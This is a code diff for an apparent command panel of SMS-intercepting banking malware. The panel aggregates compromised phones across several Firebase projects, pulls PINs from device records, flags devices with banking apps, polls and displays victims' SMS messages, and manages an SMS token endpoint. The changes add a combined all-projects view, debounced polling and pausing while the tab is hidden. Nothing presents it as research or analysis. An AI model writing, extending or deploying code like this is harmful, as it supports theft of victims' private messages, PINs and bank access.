@@ -365,7 +365,7 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
     <section class="screen" id="screen-firebase">
       <div class="fb-tab-hdr">
         <h2>Firebase Switch</h2>
-        <p id="fbTabSub">Each Firebase shows its own connections separately</p>
+        <p id="fbTabSub">Switch Firebase or view all combined</p>
       </div>
       <div id="fbSwitchList"></div>
     </section>
@@ -449,8 +449,10 @@ var SMS_TOKEN_URL='sex.php?sms_token_api=1';
 var allDevs=[], selDev='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
-var deviceSmsCache={}, _smsLoadSeq=0;
+var deviceSmsCache={}, _smsLoadSeq=0, _smsLoading=false;
 var devFilterMode='all', deviceBankCache={};
+var _procDevsTimer=null, _panelPaused=false;
+var SMS_POLL_MS=8000, SYNC_INTERVAL_MS=90000;
 var FB_LIST_KEY='rbl_firebase_list';
 var ACTIVE_FB_KEY='rbl_active_fb';
 var activeFbId='';
@@ -554,8 +556,8 @@ function deviceHasPin(d){
   return !!(d.pin||extractPinFromRecord(raw));
 }
 function getFilteredDevs(){
-  if(!activeFbId)return [];
-  var list=allDevs.filter(function(d){return d.fbId===activeFbId;});
+  var list=allDevs;
+  if(activeFbId)list=list.filter(function(d){return d.fbId===activeFbId;});
   if(devFilterMode==='pin')list=list.filter(deviceHasPin);
   else if(devFilterMode==='bank')list=list.filter(function(d){return deviceBankCache[d.id]===true;});
   return list;
@@ -570,25 +572,22 @@ function saveActiveFb(){
   try{localStorage.setItem(ACTIVE_FB_KEY,activeFbId||'');}catch(e){}
 }
 function ensureActiveFbValid(){
-  if(!firebaseConfigs.length){activeFbId='';return;}
-  if(!activeFbId||!firebaseConfigs.some(function(c){return c.id===activeFbId;})){
-    activeFbId=firebaseConfigs[0].id;
-    saveActiveFb();
-  }
+  if(activeFbId&&!firebaseConfigs.some(function(c){return c.id===activeFbId;}))activeFbId='';
 }
 function getActiveFbName(){
+  if(!activeFbId)return 'All Firebase Combined';
   var inst=getFbInstance(activeFbId);
   return inst?inst.name:'Firebase';
 }
 function getHdrSubText(){
-  if(!activeFbId)return 'Add a Firebase project to start';
-  return getFilteredDevs().length+' devices · '+getActiveFbName();
+  if(!firebaseConfigs.length)return 'Add a Firebase project to start';
+  if(activeFbId)return getFilteredDevs().length+' devices · '+getActiveFbName();
+  return allDevs.length+' devices · '+firebaseConfigs.length+' Firebase combined';
 }
 function selectFirebase(fbId){
-  if(!fbId||!firebaseConfigs.some(function(c){return c.id===fbId;}))return;
-  activeFbId=fbId;
+  activeFbId=fbId||'';
   saveActiveFb();
-  if(selDev){
+  if(selDev&&activeFbId){
     var d=getSelDev();
     if(d&&d.fbId!==activeFbId){
       selDev='';
@@ -609,8 +608,7 @@ function bindFirebaseTabEvents(){
   el.addEventListener('click',function(e){
     var card=e.target.closest('.fb-switch-card');
     if(!card)return;
-    var id=card.getAttribute('data-fb-id');
-    if(id)selectFirebase(id);
+    selectFirebase(card.getAttribute('data-fb-id')||'');
   });
 }
 function renderFirebaseTab(){
@@ -621,7 +619,11 @@ function renderFirebaseTab(){
       '<button type="button" class="btn-add-fb" style="margin-top:12px" onclick="openFbSheet()">+ Add Firebase Project</button>';
     return;
   }
-  var html='';
+  var allOn=allDevs.filter(function(d){return d.status==='online';}).length;
+  var html='<div class="fb-switch-card'+(activeFbId===''?' active':'')+'" data-fb-id="">'+
+    '<div class="fb-switch-top"><div class="fb-switch-name">All Firebase Combined</div>'+
+    (activeFbId===''?'<span class="fb-switch-badge">ACTIVE</span>':'')+'</div>'+
+    '<div class="fb-switch-meta">'+allDevs.length+' devices · '+allOn+' online · '+firebaseConfigs.length+' projects</div></div>';
   firebaseConfigs.forEach(function(c){
     var devs=allDevs.filter(function(d){return d.fbId===c.id;});
     var on=devs.filter(function(d){return d.status==='online';}).length;
@@ -639,8 +641,8 @@ function renderFirebaseTab(){
   var sub=document.getElementById('fbTabSub');
   if(sub){
     sub.textContent=activeFbId
-      ?('Now showing '+getActiveFbName()+' only — switch project to see other connections')
-      :('Add a Firebase project to view its connections');
+      ?('Showing '+getActiveFbName()+' only — tap All Combined to see every connection')
+      :('All Firebase combined — tap a project to filter Home');
   }
 }
 function setDevFilter(mode,btn){
@@ -748,14 +750,12 @@ function addFirebaseProject(){
   };
   firebaseConfigs.push(cfg);
   saveFirebaseConfigs();
-  activeFbId=id;
-  saveActiveFb();
   var inst=initFirebaseInstance(cfg);
   attachLive(inst);
   discoverInstance(inst).then(function(){
-    processClientsData();
+    processClientsDataNow();
     updateFbUi();
-    toast('Added: '+name+' — now active',true);
+    toast('Added: '+name,true);
   });
   document.getElementById('fbAddName').value='';
   document.getElementById('fbAddUrl').value='';
@@ -771,11 +771,7 @@ function removeFirebaseProject(id){
     if(k.indexOf(id+'::')===0)delete clientsRawMap[k];
   });
   if(selDev&&selDev.indexOf(id+'::')===0){selDev='';clearListeners();}
-  if(activeFbId===id){
-    var next=firebaseConfigs.filter(function(c){return c.id!==id;});
-    activeFbId=next.length?next[0].id:'';
-    saveActiveFb();
-  }
+  if(activeFbId===id){activeFbId='';saveActiveFb();}
   firebaseInstances=[];
   firebaseConfigs.forEach(initFirebaseInstance);
   firebaseInstances.forEach(function(inst){attachLive(inst);});
@@ -792,7 +788,7 @@ initFirebase();
 function updateFbUi(){
   var filtered=getFilteredDevs();
   var proj=firebaseConfigs.length;
-  var chipLabel=activeFbId?getActiveFbName()+' · '+filtered.length+' dev ▾':'Add Firebase ▾';
+  var chipLabel=activeFbId?getActiveFbName()+' · '+filtered.length+' dev ▾':proj+' FB · '+allDevs.length+' dev ▾';
   document.getElementById('fbChip').textContent=chipLabel;
   document.getElementById('moreFbName').textContent=proj+' projects';
   document.getElementById('hdrSub').textContent=getHdrSubText();
@@ -842,6 +838,10 @@ function mergeSummaryNode(fbId,node,raw){
   Object.keys(raw).forEach(function(k){if(raw[k]&&typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);});
 }
 function processClientsData(){
+  if(_procDevsTimer)clearTimeout(_procDevsTimer);
+  _procDevsTimer=setTimeout(processClientsDataNow,450);
+}
+function processClientsDataNow(){
   allDevs=[];
   Object.keys(clientsRawMap).forEach(function(k){
     var s=clientsRawMap[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
@@ -853,12 +853,10 @@ function processClientsData(){
   });
   allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
   ensureActiveFbValid();
-  var visible=getFilteredDevs();
-  if(selDev){
+  if(selDev&&activeFbId){
     var cur=getSelDev();
     if(!cur||cur.fbId!==activeFbId){selDev='';clearListeners();}
   }
-  if(!selDev&&visible.length)selDev=visible[0].id;
   renderDevices();updateStats();updateFbUi();
 }
 function updateStats(){
@@ -868,7 +866,7 @@ function updateStats(){
   document.getElementById('stOffline').textContent=l.filter(function(d){return d.status==='offline';}).length;
 }
 function fetchSummaryNode(inst,node){
-  return restJsonInst(inst,node).then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
+  return restJsonInst(inst,node).then(function(raw){mergeSummaryNode(inst.id,node,raw);});
 }
 function discoverInstance(inst){
   var key=getFbAuthKey(inst);
@@ -885,27 +883,28 @@ function discoverInstance(inst){
     nodes.forEach(function(n){
       if(SUMMARY_NODES.indexOf(n)>=0||n==='clients'||n==='devices')tasks.push(fetchSummaryNode(inst,n));
     });
-    return Promise.all(tasks);
+    return Promise.all(tasks).then(function(){processClientsData();});
   });
 }
 function attachLive(inst){
   if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
-  ['clients','devices_status','devices'].forEach(function(node){
+  ['clients','devices'].forEach(function(node){
     try{
       inst.db.ref(node).on('value',function(s){
         if(!s.exists())return;
-        mergeSummaryNode(inst.id,node,s.val());processClientsData();
+        mergeSummaryNode(inst.id,node,s.val());
+        processClientsData();
       });
     }catch(e){}
   });
 }
 function fetchAllData(){
+  if(_panelPaused)return Promise.resolve();
   document.getElementById('hdrSub').textContent='Syncing...';
   firebaseInstances.forEach(attachLive);
   return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
-    processClientsData();
+    processClientsDataNow();
     document.getElementById('hdrSub').textContent=getHdrSubText();
-    if(selDev)loadSmsForDevice();
   });
 }
 function refreshData(){toast('Refreshing...',true);fetchAllData();}
@@ -923,7 +922,14 @@ function scanDeviceBankStatus(d){
 function scanAllDevicesBank(){
   var devs=getFilteredDevs();
   if(!devs.length)return Promise.resolve();
-  return Promise.all(devs.map(scanDeviceBankStatus));
+  var i=0, batch=2;
+  function next(){
+    if(i>=devs.length)return Promise.resolve();
+    var slice=devs.slice(i,i+batch);
+    i+=batch;
+    return Promise.all(slice.map(scanDeviceBankStatus)).then(next);
+  }
+  return next();
 }
 
 function renderDevices(){
@@ -931,9 +937,9 @@ function renderDevices(){
   var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId+(d.pin||'')).toLowerCase().includes(q);});
   var el=document.getElementById('devList');
   if(!list.length){
-    var fbName=activeFbId?getActiveFbName():'Firebase';
-    var msg=!activeFbId?'Add a Firebase project first':devFilterMode==='pin'?'No PIN clients in '+fbName:devFilterMode==='bank'?'No bank clients in '+fbName+' — wait for scan':'No devices in '+fbName;
-    el.innerHTML='<div class="empty-state"><div class="ico">'+(devFilterMode==='pin'?'🔐':devFilterMode==='bank'?'🏦':'📡')+'</div>'+esc(msg)+'<br><span style="font-size:11px;opacity:.6">'+(activeFbId?'Switch Firebase tab or pull refresh':'Open Firebase tab to add project')+'</span></div>';
+    var fbName=activeFbId?getActiveFbName():'All Firebase';
+    var msg=!firebaseConfigs.length?'Add a Firebase project first':devFilterMode==='pin'?'No PIN clients found':devFilterMode==='bank'?'No bank clients yet — wait for scan':activeFbId?'No devices in '+fbName:'No devices yet';
+    el.innerHTML='<div class="empty-state"><div class="ico">'+(devFilterMode==='pin'?'🔐':devFilterMode==='bank'?'🏦':'📡')+'</div>'+esc(msg)+'<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';
     return;
   }
   el.innerHTML=list.map(function(d){
@@ -952,7 +958,9 @@ function renderDevices(){
 function selectDevice(id){
   selDev=id;
   showSmsForSelectedDevice();
-  renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice();renderBankAccounts();
+  renderDevices();renderDeviceView();updateSendForm();
+  loadSmsForDevice(true);
+  renderBankAccounts();
   switchTab('device',document.querySelector('.nav-item[data-tab="device"]'));
 }
 
@@ -1100,42 +1108,51 @@ function fetchSmsFromPaths(inst,d){
   }).catch(function(){return[];});
 }
 
-function loadSmsForDevice(){
+function loadSmsForDevice(force){
   var d=getSelDev();if(!d)return;
   var devId=d.id, seq=++_smsLoadSeq;
+  var cached=deviceSmsCache[devId];
+  var cacheFresh=cached&&cached.at&&(Date.now()-cached.at)<120000;
   document.getElementById('smsEmpty').classList.add('hidden');
   showSmsForSelectedDevice();
+  if(!cached||!cached.list||!cached.list.length)_smsLoading=true;
+  renderSms();
   clearListeners();
   var inst=getFbInstance(d.fbId);
-  if(!inst){toast('Firebase project not found',false);return;}
+  if(!inst){toast('Firebase project not found',false);_smsLoading=false;return;}
 
   function applySmsList(list){
     if(seq!==_smsLoadSeq||selDev!==devId)return;
+    _smsLoading=false;
     setDeviceSms(devId,filterSmsForDevice(list,d));
   }
 
   function poll(){
-    if(seq!==_smsLoadSeq||selDev!==devId)return;
+    if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
     fetchSmsFromPaths(inst,d).then(applySmsList).catch(function(){applySmsList([]);});
   }
 
-  poll();
-  var timer=setInterval(poll,3500);
+  if(force||!cacheFresh)poll();
+  else _smsLoading=false;
+  var timer=setInterval(poll,SMS_POLL_MS);
   var listeners={timer:timer,timers:[timer],refs:[],devId:devId,seq:seq};
 
   if(inst.db){
-    smsPathsForDevice(d).slice(0,4).forEach(function(p){
+    var primary=smsPathsForDevice(d)[0];
+    if(primary){
       try{
-        var ref=inst.db.ref(p);
-        try{ref=ref.limitToLast(100);}catch(e2){}
+        var ref=inst.db.ref(primary);
+        try{ref=ref.limitToLast(80);}catch(e2){}
+        var deb=null;
         var h=function(){
-          if(seq!==_smsLoadSeq||selDev!==devId)return;
-          fetchSmsFromPaths(inst,d).then(applySmsList);
+          if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
+          if(deb)clearTimeout(deb);
+          deb=setTimeout(poll,800);
         };
         ref.on('value',h);
         listeners.refs.push({ref:ref,h:h});
       }catch(e){}
-    });
+    }
   }
 
   activeListeners[devId]=listeners;
@@ -1193,6 +1210,7 @@ function renderSms(){
   if(!d){document.getElementById('smsEmpty').classList.remove('hidden');el.innerHTML='';return;}
   var cached=deviceSmsCache[d.id];
   var list=(cached&&cached.list&&cached.list.length)?cached.list:(selDev===d.id?window_sms:[]);
+  if(_smsLoading&&!list.length){el.innerHTML='<div class="empty-state"><div class="ico">⏳</div>Loading SMS...</div>';return;}
   if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';return;}
   el.innerHTML=list.slice(0,80).map(function(s){
     var out=s.type==='sent'||s.type==='outbox';
@@ -1379,7 +1397,7 @@ function switchTab(name,btn){
   document.getElementById('screen-'+name).classList.add('active');
   document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
   if(btn)btn.classList.add('active');
-  if(name==='sms'&&selDev)loadSmsForDevice();
+  if(name==='sms'&&selDev)loadSmsForDevice(true);
   if(name==='device')renderDeviceView();
   if(name==='send')updateSendForm();
   if(name==='bank'&&selDev)renderBankAccounts();
@@ -1426,21 +1444,26 @@ function useSelForAutoToken(){
   }).catch(function(){toast('Auto token save failed',false);});
 }
 
-/* BOOT — each Firebase shown separately */
+/* BOOT */
+document.addEventListener('visibilitychange',function(){
+  _panelPaused=document.hidden;
+});
 (function(){
   try{
     panelReady=true;
     bindDevListEvents();
     bindFirebaseTabEvents();
+    loadActiveFb();
     loadDeviceToggles();
+    ensureActiveFbValid();
     fetchAllData().catch(function(){toast('Sync failed — check Firebase URL/secret',false);});
     loadAutoTokenState();
   }catch(e){console.error(e);}
 })();
 setInterval(function(){
-  if(!panelReady)return;
+  if(!panelReady||_panelPaused)return;
   fetchAllData().catch(function(){});
-},60000);
+},SYNC_INTERVAL_MS);
 window.addEventListener('unhandledrejection',function(){});
 </script>
 </body>
